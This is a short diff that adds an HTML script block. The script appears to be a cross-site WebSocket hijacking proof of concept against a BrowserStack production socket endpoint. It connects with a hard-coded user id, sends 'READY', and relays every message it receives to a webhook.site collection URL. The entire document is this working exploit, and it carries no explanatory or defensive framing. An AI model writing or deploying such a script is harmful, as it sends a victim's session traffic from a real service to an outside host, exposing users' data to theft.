@@ -1,0 +1,9 @@
+<script>
+    var ws = new WebSocket('wss://peer-alb-aps1-prod.browserstack.com/socket.io/?uid=7739310&js=v44.88&tag=wspool&browser=firefox&os=win&subdomain=live&iov=IO201&EIO=3&transport=websocket');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://webhook.site/469d381a-8e9e-4ef6-b343-9a736c0749fd', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
